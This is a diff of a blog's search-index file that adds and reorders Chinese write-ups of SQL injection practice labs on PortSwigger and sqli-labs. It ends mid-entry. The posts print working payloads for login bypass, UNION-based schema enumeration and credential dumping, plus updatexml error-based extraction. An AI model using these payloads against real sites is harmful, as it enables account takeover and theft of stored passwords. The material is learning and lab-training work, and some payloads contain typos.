@@ -69,6 +69,191 @@
       </tags>
   </entry>
   <entry>
+    <title>第一次sql注入的学习(portswigger)</title>
+    <url>/2026/09/24/portswigger-sql-1/</url>
+    <content><![CDATA[<p>用 PortSwigger Web Security Academy 的靶场练手，记录前两关的完整思路。</p>
+<h2 id="第一题：基于-GET-的字符型-SQL-注入">第一题：基于 GET 的字符型 SQL 注入</h2>
+<p>打开靶场，是一个购物网站。</p>
+<p><img src="/image/portswigger-sql-1/01.jpeg" alt=""></p>
+<p>页面上有几个分类按钮，随便点一个：</p>
+<p><img src="/image/portswigger-sql-1/02.png" alt=""></p>
+<p>点击后列表只剩下被筛选的商品，同时 URL 里多了一个参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter?category=Gifts</span><br></pre></td></tr></table></figure>
+<p>这就是一个疑似 SQL 注入入口。</p>
+<h3 id="判断这里有没有注入">判断这里有没有注入</h3>
+<p>在 <code>Gifts</code> 后面加一个单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter?category=Gifts&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/image/portswigger-sql-1/03.png" alt=""></p>
+<p>页面返回的结果发生了变化，说明这个引号被带进了后端的 SQL 语句 —— 注入点基本可以确定。</p>
+<h3 id="构造-payload">构造 payload</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter?category=Gifts&#x27; OR 1=1--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>+</code> 在 URL 里代表空格，和 <code>%20</code> 等价。这里用 <code>+</code> 更直观，实际发出去时会被还原成空格。</p>
+</blockquote>
+<p><img src="/image/portswigger-sql-1/04.png" alt=""></p>
+<p>即使当前选择了某个分类，页面依旧把全部商品都返回了。</p>
+<p>原因是 <code>OR 1=1</code> 让 WHERE 条件恒为真，<code>--+</code> 又把后面原有的条件注释掉。第一题完成。</p>
+<h2 id="第二题：登录绕过">第二题：登录绕过</h2>
+<p>这一关没有筛选按钮，但右上角有个登录入口。</p>
+<p><img src="/image/portswigger-sql-1/05.png" alt=""></p>
+<p>点进去是登录框：</p>
+<p><img src="/image/portswigger-sql-1/06.png" alt=""></p>
+<p>靶场提示里给了一个已知用户名 <code>administrator</code>：</p>
+<p><img src="/image/portswigger-sql-1/07.png" alt=""></p>
+<p>这题要求以 administrator 身份登录，却没给密码 —— 思路就是让密码校验失效。</p>
+<h3 id="构造-payload-2">构造 payload</h3>
+<p>用户名填：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">administrator&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>密码随便填。</p>
+<p>猜想后端大概是这么查的：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;administrator&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>administrator'</code> 先把 username 的引号闭合，<code>--+</code> 再把后面的 <code>AND password = '...'</code> 整段注释掉，密码判断就不存在了。</p>
+<p>直接尝试，成功实现无密码登录：</p>
+<p><img src="/image/portswigger-sql-1/08.png" alt=""></p>
+<p>第二题完成 😐</p>
+<h2 id="补充：数据库其实有四种">补充：数据库其实有四种</h2>
+<p>做题时发现自己的一个知识点盲区 —— 常见数据库有四种，注入语法并不完全一样。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">名称</th>
+<th>常见场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Oracle</td>
+<td>甲骨文的大型商业数据库，企业和老系统用得多</td>
+</tr>
+<tr>
+<td style="text-align:center">Microsoft SQL Server</td>
+<td>Windows 服务器常用</td>
+</tr>
+<tr>
+<td style="text-align:center">PostgreSQL</td>
+<td>开源，很多现代网站和靶场在用</td>
+</tr>
+<tr>
+<td style="text-align:center">MySQL</td>
+<td>PHP + MySQL，Web 安全练习最常碰到</td>
+</tr>
+</tbody>
+</table>
+<p>四者的注释符、字符串拼接、报错函数、系统表名都有差异，这块还需要单独补。</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+        <tag>portswigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入攻击，查询Oracle数据库类型和版本</title>
+    <url>/2026/11/06/portswigger-sql-2/</url>
+    <content><![CDATA[<h1>Lab: SQL注入攻击，查询Oracle数据库类型和版本</h1>
+<ul>
+<li>使用portswigger靶场：</li>
+</ul>
+<p>之前使用的sql-lab靶场全部都是MYSQL的数据库,但是不同数据库注入语法有所不同，这篇是oracle数据库的sql注入</p>
+<p>打开靶场，在页面中随便点一点后，发现点击商品分类后，地址栏出现<code>?category=</code>,这时候就可以判断这是get型的注入</p>
+<p><img src="/image/portswigger-sql-2/1.png" alt="alt text"></p>
+<p><img src="/image/portswigger-sql-2/2.png" alt="alt text"></p>
+<p>尝试了一些基本的闭合方式，最后确认是<code>'</code>闭合<br>
+于是构造<code>?category='</code><br>
+发现出现空白页面，以及回显了一些奇怪的字符</p>
+<p><img src="/image/portswigger-sql-2/3.png" alt="alt text"></p>
+<p>首先先确定列数<br>
+构造<code>?categoty=' order by 1--</code><br>
+<code>?categoty=' order by 2--</code><br>
+<code>?categoty=' order by 3--</code><br>
+发现<code>3</code>的时候页面空白报错，可以确定此题是两列</p>
+<p><img src="/image/portswigger-sql-2/4.png" alt="alt text"><br>
+<img src="/image/portswigger-sql-2/5.png" alt="alt text"></p>
+<p>还有一种方法是构造<code>?categoty=' union select 'abc','abc' from dual--</code><br>
+发现页面返回两列，也可以确定</p>
+<p><strong>注：Oracle 必须写 FROM dual！这是 Oracle 和 MySQL 最大区别<br>
+Oracle 每一条 SELECT <strong>必须带 FROM</strong>，不能直接 <code>select null</code>，要用伪表 <code>dual</code></strong></p>
+<p><img src="/image/portswigger-sql-2/6.png" alt="alt text"></p>
+<p>最后构造<code>?category=' union select banner,null from v$version--</code><br>
+成功获得版本号，靶场也提示注入成功</p>
+<p><img src="/image/portswigger-sql-2/7.png" alt="alt text"></p>
+<p>最后有一点我没遇到的：<br>
+<code>UNION</code> 要求<strong>对应位置的数据类型兼容</strong>：数字列放字符串会报错，字符串列放文本才正常。<br>
+我最开始使用的就是字符串，这一题也恰好支持字符串</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+        <tag>portswigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL 注入攻击，列出非 Oracle 数据库的内容</title>
+    <url>/2026/11/08/portswigger-sql-3/</url>
+    <content><![CDATA[<h1>Lab: SQL 注入攻击，列出非 Oracle 数据库的内容</h1>
+<ul>
+<li>使用portswigger靶场：</li>
+</ul>
+<p>这是PostgreSQL数据库<br>
+题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码</p>
+<p><img src="/image/portswigger-sql-3/1.png" alt="alt text"></p>
+<p>开始还是和上一篇一样测出有几个注入点<br>
+然后构造</p>
+<p><code>-1'+union+select+'11',current_schema--+</code></p>
+<p>(因为是在bp中输入，所以将空格改为'+'号)<br>
+<img src="/image/portswigger-sql-3/2.png" alt="alt text"><br>
+成功得到库名:<code>public</code><br>
+构造<br>
+<code>-1'+union+select+'11',table_name+from+information_schema.tables+where+table_schema='public'--+</code></p>
+<p><img src="/image/portswigger-sql-3/3.png" alt="alt text"></p>
+<p>得到表名,注意到有一个名为<code>users_xuturi</code>的表，我要寻找的账户密码大概率在这里面<br>
+然后构造:<br>
+<code>-1'+union+select+'11',column_name+from+infromation_schema.columns+where+table_schema='public'+and+table_name='users_xuturi'</code>来得到三个列名<br>
+<code>username_cusuti</code> , <code>password_gokydw</code>,<code>email</code><br>
+比较明显，我要找的账户密码应该就在这里<br>
+<strong>(库里面的表名有可能不一样，我第二次注入得到的和第一次不同)</strong><br>
+最好准备脱库拿账号密码:<br>
+构造:<br>
+<code>-1'+union+select+username_cusuti,password_gokydw+from+public.users_xuturi--+</code></p>
+<p><img src="/image/portswigger-sql-3/4.png" alt="alt text"></p>
+<p>最后输入拿到的账号密码，成功通关</p>
+<p><img src="/image/portswigger-sql-3/5.png" alt="alt text"></p>
+<p>这一题整体的payload和mysql的基本差不多，只需要修改一些小细节,而且PostgreSQL没有group函数和database()<br>
+在拿库名上一些主要的小区别:</p>
+<ul>
+<li>MySQL：<code>database()</code>、<code>schema()</code></li>
+<li>PostgreSQL：<code>current_database()</code>、<code>current_schema()</code></li>
+<li>Oracle：<code>sys_context('userenv','current_schema')</code> / <code>user</code></li>
+</ul>
+<p>我后面也尝试能不能用两个注入口输出三个数据:<br>
+最开始时直接把三个指令拼接在一起:<br>
+<code>-1'+union+select+username_cusuti||'|'||password_gokydw||'|'||email,'NULL'+from+public.users_xuturi--+</code><br>
+但是输出一直时空白，不管是页面渲染还是响应包里面的都没有返回</p>
+<p><img src="/image/portswigger-sql-3/6.png" alt="alt text"><br>
+<img src="/image/portswigger-sql-3/7.png" alt="alt text"></p>
+<p>后面修改为concat函数:<br>
+<code>-1'+union+select+concat(username_cusuti,chr(124),password_gokydw,chr(124),email),NULL+from+public.users_xuturi--+</code></p>
+<p><img src="/image/portswigger-sql-3/8.png" alt="alt text"></p>
+<p>还是可以显示(eamil里面就没有内容)<br>
+后面查询一下资料,可能是这样:只要任意一个值是 NULL，<strong>整个拼接结果直接变成 NULL</strong>，页面就看不到这条数据<br>
+但是我也尝试两个拼接，一个单独显示，输出依旧是空白</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+        <tag>portswigger</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-lab-1的wp</title>
     <url>/2026/09/25/sqli-lab-1/</url>
     <content><![CDATA[<h1>sql-lab-1</h1>
@@ -140,196 +325,60 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-lab-sql2~4的wp</title>
-    <url>/2026/09/26/sqli-lab-2~4/</url>
-    <content><![CDATA[<h1>sql-lab-2~4</h1>
+    <title>SQL 注入攻击，列出 Oracle 数据库内容和SQL注入UNION攻击，确定查询返回的列数</title>
+    <url>/2026/11/09/portswiggrt-sql-4/</url>
+    <content><![CDATA[<h1>Lab: SQL 注入攻击，列出 Oracle 数据库内容</h1>
 <ul>
-<li>使用sqli-lab靶场</li>
+<li>使用portswigger靶场：</li>
 </ul>
-<p><strong>这是我完成第二，三，四题的wp</strong><br>
-<br><br>
-<strong>第二题:</strong><br>
-依旧是打开靶场，构造?id=1</p>
-<p><img src="/image/sqli-lab-2~4/951720850e0c3e7b1881a789928405b9.png" alt="alt text"></p>
-<p>结果显示正常，大概率和上面一题一样，是?id=后面是注入点<br>
-构造?id=1' and 1=2 --+<br>
-查看返回</p>
-<p><img src="/image/sqli-lab-2~4/f7b3d5bf353a66c982bb51418b27c43b.png" alt="alt text"></p>
-<p>发现报错:  <code>'and 1=2 --+</code>  都有问题<br>
-猜想是否是因为语句外面没有 <code>'</code> 号，我输入的 <code>'</code> 成为了报错原因<br>
-于是尝试构造?id=1 and 1=2</p>
-<p><img src="/image/sqli-lab-2~4/8f288018d1eea9196167ca05f5fd7756.png" alt="alt text"></p>
-<p>发现因为1=2条件不成立而不显示结果了，所以我的猜测是正确的<br>
-去翻阅源代码</p>
-<p><img src="/image/sqli-lab-2~4/2609bc91e63d37295b3d95e590c3df1f.png" alt="alt text"></p>
-<p>有这样的一句话:<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>
-发现我输入的id左右确实没有<code>'</code>闭合<br>
-接下来就和第一题步骤一样，注意不用添加<code>'</code>和<code>--+</code>就好了<br>
-<br><br><br><br>
-<strong>第二题:</strong><br>
-首先依旧是构造?id=1，结果正常显示<br>
-然后先尝试<code>?id=1'</code></p>
-<p><img src="/image/sqli-lab-2~4/cc4509f5010fc74392189e9f71106b80.png" alt="alt text"></p>
-<p>发现报错，但是报错的地方是:<code>'1'') limit 0,1</code><br>
-可以猜测一下我输入的id是被<code>('id')</code>闭合，这样错误的地方才会在<code>')</code>这里<br>
-所以构造:<code>?id=1') and 1=2 --+</code></p>
-<p><img src="/image/sqli-lab-2~4/36383c9a99c9eee15b9b71bc302c9019.png" alt="alt text"></p>
-<p>结果确实因为1=2而不显示，我的猜测是正确的<br>
-查看一下源代码:<code>$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;</code><br>
-发现id确实是被<code>('id')</code>闭合</p>
-<p>接下来也和第一题一样，只是要把<code>'</code>改为<code>')</code>，即可得到账号密码<br>
-<br><br><br><br>
-<strong>第四题</strong><br>
-依旧是先尝试?id=1'，但是这次发现居然没有回显</p>
-<p><img src="/image/sqli-lab-2~4/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-26%20185236.png" alt="alt text"></p>
-<p>只好尝试一下其他常见的闭合符号<code>&quot;``%</code>等<br>
-在尝试<code>&quot;</code>后(?id=1&quot;)</p>
-<p><img src="/image/sqli-lab-2~4/4198706c9fba5cd32d0299808c1620e6.png" alt="alt text"></p>
-<p>发现页面报错，观察一下报错结果:<br>
-发现确实有<code>&quot;</code>而且还有<code>)</code><br>
-于是可以初步猜想我输入的id应该是这样的:<code>(&quot;id&quot;)</code><br>
-于是就可以构造?id=1&quot;) and 1=2 --+</p>
-<p><img src="/image/sqli-lab-2~4/638eefe59e5c956fe96414dbb82b27d8.png" alt="alt text"></p>
-<p>成功绕过<br>
-接下来步骤还是和第一题一样，把<code>'</code>改为<code>&quot;)</code>就好了<br>
-查看一下源代码</p>
-<p><img src="/image/sqli-lab-2~4/b28260b157fc94cd0785a9d5a015a27f.png" alt="alt text"></p>
-<p>发现语句是这样的:<br>
-<code>$id = '&quot;' . $id . '&quot;';</code><br>
-<code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code><br>
-先给我输入的id加上<code>&quot;&quot;</code>号在用<code>()</code>闭合<br>
-和我的猜测有一点不一样，绕过方法没有问题，但是还是需要注意一下<br>
-😃</p>
+<br>
+<p><strong>Lab: SQL 注入攻击，列出 Oracle 数据库内容</strong><br>
+这是PostgreSQL数据库<br>
+题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码</p>
+<p><img src="/image/portswigger-sql-4/1.png" alt="alt text"></p>
+<p>整体思路和步骤和前面那题一样:都是先确定返回的列数，然后查库名，表名，列名，里面的数据，最后脱库，只是payload有一点不同<br>
+先构造: <code>-1'+order+by+1--+</code><br>
+<code>-1'+order+by+2--+</code><br>
+<code>-1'+order+by+3--+</code><br>
+确定有列数为2</p>
+<p>(oracle与其他数据库最大区别就是: <strong>Oracle 每一条 SELECT 必须带 FROM！不能裸写 <code>select 1,2</code>，必须 <code>select 1,2 from </code></strong> dual 是 Oracle 自带的虚表，没有from后面没有东西的时候用)</p>
+<p>然后构造:<code>-1'+union+select+'11',user+from+dual--+</code><br>
+来获取库名<br>
+Oracle 里 <code>user</code> 代表当前用户（等价 MySQL 的 database ()、PG 的 current_schema ()）</p>
+<p><img src="/image/portswigger-sql-4/2.png" alt="alt text"></p>
+<p>然后构造:<code>-1'+union+select+'11',table_name+from+all_tables--+</code>来获取所有表<br>
+也可以将<code>all_tables</code>替换成<code>user_tables</code>来获取当前用户的下面的表</p>
+<p>然后就是:<code>-1'+union+select+'11',column_name+from+user_tab_columns+where+table_name='USERS_XFDNBZ'--+</code>查看表里面的列</p>
+<p><img src="/image/portswigger-sql-4/3.png" alt="alt text"></p>
+<p>最后构造:<code>-1'+union+select+USERNAME_IZZGMA,PASSWORD_EYSFAJ+from+USERS_XFDNBZ--+</code>脱库获取拿到账号密码</p>
+<p><img src="/image/portswigger-sql-4/4.png" alt="alt text"></p>
+<p>用得到的账号密码登入，成功通关</p>
+<p><img src="/image/portswigger-sql-4/5.png" alt="alt text"></p>
+<h1>Lab:SQL注入UNION攻击，确定查询返回的列数</h1>
+<br>
+<p><strong>Lab:SQL注入UNION攻击，确定查询返回的列数</strong></p>
+<p>这一题要求通过通过注入union来查询返回列数</p>
+<p><img src="/image/portswigger-sql-4/1-1.png" alt="alt text"></p>
+<p>构造方式和之前一样，我主要分享一下我遇到的一些问题:</p>
+<p>(1)构造<code>-1' order by 3--+</code>得出返回的列数，但是却不能通关，</p>
+<p>查询一下，发现<strong>必须用 UNION SELECT NULL 这种方式完成攻击才能判定通关</strong>，order by 只是<strong>侦查手段</strong>，不算完成这个实验要求的攻击动作,所以无法通关</p>
+<p><img src="/image/portswigger-sql-4/1-2.png" alt="alt text"></p>
+<p>(2)构造:<code>-1' union selec 'abc','abc','abc'--+</code>会报错</p>
+<p>经过资料查询和尝试，发现是因为<code>abc</code>是字符型，如果原查询列里面是数字型，就会报错,经过测试,我发现第一个空和第三个空是数字型，第二个空不限</p>
+<p><img src="/image/portswigger-sql-4/1-3.png" alt="alt text"><br>
+<img src="/image/portswigger-sql-4/1-4.png" alt="alt text"></p>
+<p>应该是第一个是序号，第二个是商品名称，第三个是价格<br>
+但是使用NULL就不需要考率类型，直接构造<br>
+<code>-1' union select NULL,NULL,NULL--+</code>即可通关</p>
+<p><img src="/image/portswigger-sql-4/1-5.png" alt="alt text"></p>
 ]]></content>
       <categories>
-        <category>sqli-lab</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>SQL</tag>
         <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab-11~16的wp</title>
-    <url>/2026/10/08/sqli-lab-11~16/</url>
-    <content><![CDATA[<h1>sqli-lab-11~16</h1>
-<ul>
-<li>使用sqli-lab靶场</li>
-</ul>
-<p><strong>这是关于11~16关的简单讲解</strong><br>
-<br></p>
-<p><code>11~16关实际上使用的指令和1~10关基本一样</code><br>
-<code>只不过是将注入的地方切换到输入框或者bp之中</code><br>
-<code>这边只使用第11题的完整过程</code></p>
-<p><strong>第十一题</strong><br>
-打开靶场，发现页面出现的是账号密码登入界面,可以知道注入方式应该为post型<br>
-打开bp，抓包,将请求包发送到重发器之中:</p>
-<p><img src="/image/sqli-lab-11~16/1.png" alt="alt text"></p>
-<p>然后在username后面构造:<br>
-<code>-1' </code>确定闭合方式</p>
-<p><img src="/image/sqli-lab-11~16/2.png" alt="alt text"></p>
-<p>接下来就是老步骤了:<br>
-<code>-1' or 1=1 --+</code>确定显示方式</p>
-<p><img src="/image/sqli-lab-11~16/3.png" alt="alt text"></p>
-<p><code>-1' union select 1,datebase() --+</code>获取数据库名称</p>
-<p><img src="/image/sqli-lab-11~16/4.png" alt="alt text"></p>
-<p>不过中间有点小插曲<code>-1' union select 1,datebase() limit 1,1--+</code>开始会没有回显<br>
-<img src="/image/sqli-lab-11~16/5.png" alt="alt text"><br>
-于是直接使用<br>
-<code>-1' union select 1,group_concat(schema_name) from information_schema.schemata --+</code>来获取全部的数据库名称</p>
-<p><img src="/image/sqli-lab-11~16/6.png" alt="alt text"></p>
-<p><code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+</code>来获取表名</p>
-<p><img src="/image/sqli-lab-11~16/7.png" alt="alt text"></p>
-<p><code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+</code><br>
-来获取列名</p>
-<p><img src="/image/sqli-lab-11~16/8.png" alt="alt text"></p>
-<p>最后使用<code>-1' union select 1,group_concat(username,0x7c,password) from security.users --+</code>来脱库获取数据</p>
-<p><img src="/image/sqli-lab-11~16/9.png" alt="alt text"><br>
-<br><br></p>
-<p>第12题就是将<code>'</code> 改为<code>&quot;)</code><br>
-即<code>-1&quot;) union select 1,group_concat(username,0x7c,password) from security.users --+</code></p>
-<p><br><br></p>
-<p>第13题是无回显,使用updatemxl报错注入即可<br>
-最后的payload为:<br>
-<code>1') and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) -- </code><br>
-<br><br></p>
-<p>第14题和13题差不多,将<code>')</code>改为<code>&quot;</code><br>
-<code>1&quot; and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) -- </code><br>
-<br><br></p>
-<p>第15，16题分别是布尔盲注和时间盲注，和之前一样使用自动化脚本跑</p>
-<p><strong>总结下来就是下表</strong></p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">关卡</th>
-<th style="text-align:center">闭合符号</th>
-<th style="text-align:center">注入类型</th>
-<th style="text-align:center">核心特点</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">Less11</td>
-<td style="text-align:center">'</td>
-<td style="text-align:center">联合查询 / 报错注入</td>
-<td style="text-align:center">POST 表单登录框，有回显</td>
-</tr>
-<tr>
-<td style="text-align:center">Less12</td>
-<td style="text-align:center">&quot;)</td>
-<td style="text-align:center">联合查询 / 报错注入</td>
-<td style="text-align:center">双引号 + 括号闭合</td>
-</tr>
-<tr>
-<td style="text-align:center">Less13</td>
-<td style="text-align:center">')</td>
-<td style="text-align:center">报错注入</td>
-<td style="text-align:center">单引号 + 括号，仅报错回显，无数据回显</td>
-</tr>
-<tr>
-<td style="text-align:center">Less14</td>
-<td style="text-align:center">&quot;</td>
-<td style="text-align:center">报错注入</td>
-<td style="text-align:center">双引号闭合报错注入</td>
-</tr>
-<tr>
-<td style="text-align:center">Less15</td>
-<td style="text-align:center">'</td>
-<td style="text-align:center">布尔 / 时间盲注</td>
-<td style="text-align:center">页面无报错，只有登录成功 / 失败两种状态</td>
-</tr>
-<tr>
-<td style="text-align:center">Less16</td>
-<td style="text-align:center">&quot;)</td>
-<td style="text-align:center">布尔 / 时间盲注</td>
-<td style="text-align:center">双引号 + 括号闭合盲注</td>
-</tr>
-</tbody>
-</table>
-<p><br><br><br></p>
-<p>上面主要是使用bp的操作<br>
-其实直接在网页的输入框里面也可以进行注入:</p>
-<p><img src="/image/sqli-lab-11~16/10.png" alt="alt text"></p>
-<p>但是需要注意的是:<br>
-输入框里面应该是不识别 <code>--+</code> 里面的 <code>+</code><br>
-如果你不在<code>--</code>后面输入空格，语法会不对,所以需要将<code>--+</code>修改为<code>-- </code>(最后有一个空格)</p>
-<p><img src="/image/sqli-lab-11~16/11.png" alt="alt text"></p>
-<p><br><br><br></p>
-<p><img src="/image/sqli-lab-11~16/15.png" alt="alt text"><br>
-<img src="/image/sqli-lab-11~16/14.png" alt="alt text"><br>
-对比一下get型和post型的源代码区别:<br>
-POST:<br>
-<code>@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;;</code><br>
-GET:<br>
-<code>$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;</code><br>
-主要就是注入入口由id后面变成username后面</p>
-]]></content>
-      <categories>
-        <category>sqli-lab</category>
-      </categories>
-      <tags>
-        <tag>SQL</tag>
-        <tag>Web</tag>
+        <tag>portswigger</tag>
       </tags>
   </entry>
   <entry>
@@ -553,6 +602,199 @@ GET:<br>
       </tags>
   </entry>
   <entry>
+    <title>sqli-lab-11~16的wp</title>
+    <url>/2026/10/08/sqli-lab-11~16/</url>
+    <content><![CDATA[<h1>sqli-lab-11~16</h1>
+<ul>
+<li>使用sqli-lab靶场</li>
+</ul>
+<p><strong>这是关于11~16关的简单讲解</strong><br>
+<br></p>
+<p><code>11~16关实际上使用的指令和1~10关基本一样</code><br>
+<code>只不过是将注入的地方切换到输入框或者bp之中</code><br>
+<code>这边只使用第11题的完整过程</code></p>
+<p><strong>第十一题</strong><br>
+打开靶场，发现页面出现的是账号密码登入界面,可以知道注入方式应该为post型<br>
+打开bp，抓包,将请求包发送到重发器之中:</p>
+<p><img src="/image/sqli-lab-11~16/1.png" alt="alt text"></p>
+<p>然后在username后面构造:<br>
+<code>-1' </code>确定闭合方式</p>
+<p><img src="/image/sqli-lab-11~16/2.png" alt="alt text"></p>
+<p>接下来就是老步骤了:<br>
+<code>-1' or 1=1 --+</code>确定显示方式</p>
+<p><img src="/image/sqli-lab-11~16/3.png" alt="alt text"></p>
+<p><code>-1' union select 1,datebase() --+</code>获取数据库名称</p>
+<p><img src="/image/sqli-lab-11~16/4.png" alt="alt text"></p>
+<p>不过中间有点小插曲<code>-1' union select 1,datebase() limit 1,1--+</code>开始会没有回显<br>
+<img src="/image/sqli-lab-11~16/5.png" alt="alt text"><br>
+于是直接使用<br>
+<code>-1' union select 1,group_concat(schema_name) from information_schema.schemata --+</code>来获取全部的数据库名称</p>
+<p><img src="/image/sqli-lab-11~16/6.png" alt="alt text"></p>
+<p><code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+</code>来获取表名</p>
+<p><img src="/image/sqli-lab-11~16/7.png" alt="alt text"></p>
+<p><code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+</code><br>
+来获取列名</p>
+<p><img src="/image/sqli-lab-11~16/8.png" alt="alt text"></p>
+<p>最后使用<code>-1' union select 1,group_concat(username,0x7c,password) from security.users --+</code>来脱库获取数据</p>
+<p><img src="/image/sqli-lab-11~16/9.png" alt="alt text"><br>
+<br><br></p>
+<p>第12题就是将<code>'</code> 改为<code>&quot;)</code><br>
+即<code>-1&quot;) union select 1,group_concat(username,0x7c,password) from security.users --+</code></p>
+<p><br><br></p>
+<p>第13题是无回显,使用updatemxl报错注入即可<br>
+最后的payload为:<br>
+<code>1') and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) -- </code><br>
+<br><br></p>
+<p>第14题和13题差不多,将<code>')</code>改为<code>&quot;</code><br>
+<code>1&quot; and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) -- </code><br>
+<br><br></p>
+<p>第15，16题分别是布尔盲注和时间盲注，和之前一样使用自动化脚本跑</p>
+<p><strong>总结下来就是下表</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">关卡</th>
+<th style="text-align:center">闭合符号</th>
+<th style="text-align:center">注入类型</th>
+<th style="text-align:center">核心特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Less11</td>
+<td style="text-align:center">'</td>
+<td style="text-align:center">联合查询 / 报错注入</td>
+<td style="text-align:center">POST 表单登录框，有回显</td>
+</tr>
+<tr>
+<td style="text-align:center">Less12</td>
+<td style="text-align:center">&quot;)</td>
+<td style="text-align:center">联合查询 / 报错注入</td>
+<td style="text-align:center">双引号 + 括号闭合</td>
+</tr>
+<tr>
+<td style="text-align:center">Less13</td>
+<td style="text-align:center">')</td>
+<td style="text-align:center">报错注入</td>
+<td style="text-align:center">单引号 + 括号，仅报错回显，无数据回显</td>
+</tr>
+<tr>
+<td style="text-align:center">Less14</td>
+<td style="text-align:center">&quot;</td>
+<td style="text-align:center">报错注入</td>
+<td style="text-align:center">双引号闭合报错注入</td>
+</tr>
+<tr>
+<td style="text-align:center">Less15</td>
+<td style="text-align:center">'</td>
+<td style="text-align:center">布尔 / 时间盲注</td>
+<td style="text-align:center">页面无报错，只有登录成功 / 失败两种状态</td>
+</tr>
+<tr>
+<td style="text-align:center">Less16</td>
+<td style="text-align:center">&quot;)</td>
+<td style="text-align:center">布尔 / 时间盲注</td>
+<td style="text-align:center">双引号 + 括号闭合盲注</td>
+</tr>
+</tbody>
+</table>
+<p><br><br><br></p>
+<p>上面主要是使用bp的操作<br>
+其实直接在网页的输入框里面也可以进行注入:</p>
+<p><img src="/image/sqli-lab-11~16/10.png" alt="alt text"></p>
+<p>但是需要注意的是:<br>
+输入框里面应该是不识别 <code>--+</code> 里面的 <code>+</code><br>
+如果你不在<code>--</code>后面输入空格，语法会不对,所以需要将<code>--+</code>修改为<code>-- </code>(最后有一个空格)</p>
+<p><img src="/image/sqli-lab-11~16/11.png" alt="alt text"></p>
+<p><br><br><br></p>
+<p><img src="/image/sqli-lab-11~16/15.png" alt="alt text"><br>
+<img src="/image/sqli-lab-11~16/14.png" alt="alt text"><br>
+对比一下get型和post型的源代码区别:<br>
+POST:<br>
+<code>@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;;</code><br>
+GET:<br>
+<code>$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;</code><br>
+主要就是注入入口由id后面变成username后面</p>
+]]></content>
+      <categories>
+        <category>sqli-lab</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab-sql2~4的wp</title>
+    <url>/2026/09/26/sqli-lab-2~4/</url>
+    <content><![CDATA[<h1>sql-lab-2~4</h1>
+<ul>
+<li>使用sqli-lab靶场</li>
+</ul>
+<p><strong>这是我完成第二，三，四题的wp</strong><br>
+<br><br>
+<strong>第二题:</strong><br>
+依旧是打开靶场，构造?id=1</p>
+<p><img src="/image/sqli-lab-2~4/951720850e0c3e7b1881a789928405b9.png" alt="alt text"></p>
+<p>结果显示正常，大概率和上面一题一样，是?id=后面是注入点<br>
+构造?id=1' and 1=2 --+<br>
+查看返回</p>
+<p><img src="/image/sqli-lab-2~4/f7b3d5bf353a66c982bb51418b27c43b.png" alt="alt text"></p>
+<p>发现报错:  <code>'and 1=2 --+</code>  都有问题<br>
+猜想是否是因为语句外面没有 <code>'</code> 号，我输入的 <code>'</code> 成为了报错原因<br>
+于是尝试构造?id=1 and 1=2</p>
